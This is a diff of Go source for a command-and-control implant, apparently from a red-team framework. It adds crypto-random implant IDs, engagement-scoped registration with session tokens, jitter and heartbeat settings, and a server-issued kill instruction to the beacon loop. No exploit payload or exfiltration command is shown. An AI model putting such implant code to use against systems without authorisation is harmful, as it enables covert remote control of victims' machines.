@@ -2,7 +2,9 @@ package main
 
 import (
 	"context"
+	crand "crypto/rand"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"flag"
@@ -56,12 +58,13 @@ func readMessage(conn net.Conn) (*protocol.Message, error) {
 }
 
 func generateImplantID() string {
-	const charset = "abcdef0123456789"
 	b := make([]byte, 16)
-	for i := range b {
-		b[i] = charset[rand.Intn(len(charset))]
+	if _, err := crand.Read(b); err != nil {
+		// Degraded but non-empty: an empty ID would disable session rebinding.
+		log.Printf("secure implant ID generation failed: %v", err)
+		return fmt.Sprintf("%016x", uint64(time.Now().UnixNano()))
 	}
-	return string(b)
+	return hex.EncodeToString(b)
 }
 
 func collectSystemInfo() protocol.RegisterData {
@@ -105,30 +108,63 @@ func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
 	return conn, nil
 }
 
-func register(conn net.Conn, info protocol.RegisterData) (string, error) {
+type registerResult struct {
+	SessionID       string
+	SessionToken    string
+	ProtocolVersion int
+	Heartbeat       time.Duration
+	Kill            bool
+	KillReason      string
+}
+
+func register(conn net.Conn, info protocol.RegisterData, engagementID string, interval time.Duration, jitter float64) (*registerResult, error) {
+	info.ProtocolVersion = protocol.CurrentVersion
+	info.Capabilities = []string{protocol.CapabilityKill, protocol.CapabilitySessionToken}
+	info.EngagementID = engagementID
+	info.SleepMs = int(interval / time.Millisecond)
+	info.JitterPct = int(jitter * 100)
+	info.Transports = []string{"mtls"}
+
 	regData, err := json.Marshal(info)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	msg := &protocol.Message{Type: "register", Data: regData}
 	if err := sendMessage(conn, msg); err != nil {
-		return "", fmt.Errorf("send register: %w", err)
+		return nil, fmt.Errorf("send register: %w", err)
 	}
 
 	ack, err := readMessage(conn)
 	if err != nil {
-		return "", fmt.Errorf("read register_ack: %w", err)
+		return nil, fmt.Errorf("read register_ack: %w", err)
 	}
 	if ack.Type != "register_ack" {
-		return "", fmt.Errorf("expected register_ack, got %s", ack.Type)
+		return nil, fmt.Errorf("expected register_ack, got %s", ack.Type)
 	}
 
 	var ackData protocol.RegisterAckData
 	if err := json.Unmarshal(ack.Data, &ackData); err != nil {
-		return "", fmt.Errorf("unmarshal register_ack: %w", err)
+		return nil, fmt.Errorf("unmarshal register_ack: %w", err)
+	}
+	if ackData.SessionID == "" {
+		return nil, fmt.Errorf("register_ack has no session ID")
 	}
 
-	return ackData.SessionID, nil
+	result := &registerResult{
+		SessionID:       ackData.SessionID,
+		SessionToken:    ackData.SessionToken,
+		ProtocolVersion: protocol.Negotiate(ackData.ProtocolVersion),
+		Kill:            ackData.Kill,
+		KillReason:      ackData.KillReason,
+	}
+	heartbeatMs := ackData.HeartbeatMs
+	if heartbeatMs <= 0 {
+		heartbeatMs = ackData.Interval
+	}
+	if heartbeatMs > 0 {
+		result.Heartbeat = time.Duration(heartbeatMs) * time.Millisecond
+	}
+	return result, nil
 }
 
 func main() {
@@ -221,16 +257,24 @@ func main() {
 		}
 		backoff = time.Second // reset on successful connect
 
-		sessionID, err := register(conn, sysInfo)
+		reg, err := register(conn, sysInfo, *engagementID, *interval, *jitter)
 		if err != nil {
 			log.Printf("register failed: %v", err)
 			conn.Close()
 			continue
 		}
+		if reg.Kill {
+			log.Printf("kill instruction at registration: %s", reg.KillReason)
+			conn.Close()
+			return
+		}
+		if reg.Heartbeat > 0 {
+			*interval = reg.Heartbeat
+		}
 
-		log.Printf("registered, session_id=%s", sessionID)
+		log.Printf("registered, session_id=%s protocol=v%d", reg.SessionID, reg.ProtocolVersion)
 
-		err = beaconLoop(ctx, conn, sessionID, *interval, *jitter)
+		err = beaconLoop(ctx, conn, reg.SessionID, reg.SessionToken, *interval, *jitter)
 		conn.Close()
 
 		if ctx.Err() != nil {
@@ -389,7 +433,7 @@ func checkTaskSafety(ctx context.Context, t protocol.TaskWire) error {
 	return nil
 }
 
-func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval time.Duration, jitter float64) error {
+func beaconLoop(ctx context.Context, conn net.Conn, sessionID, sessionToken string, interval time.Duration, jitter float64) error {
 	// Tasks run on background workers so a long scan or shell command does not
 	// stop the implant from checking in. Results are flushed at the start of
 	// each cycle.
@@ -420,7 +464,10 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 		}
 
 		// Send checkin.
-		checkinData, _ := json.Marshal(protocol.CheckinData{SessionID: sessionID})
+		checkinData, _ := json.Marshal(protocol.CheckinData{
+			SessionID:    sessionID,
+			SessionToken: sessionToken,
+		})
 		if err := sendMessage(conn, &protocol.Message{Type: "checkin", Data: checkinData}); err != nil {
 			return fmt.Errorf("send checkin: %w", err)
 		}
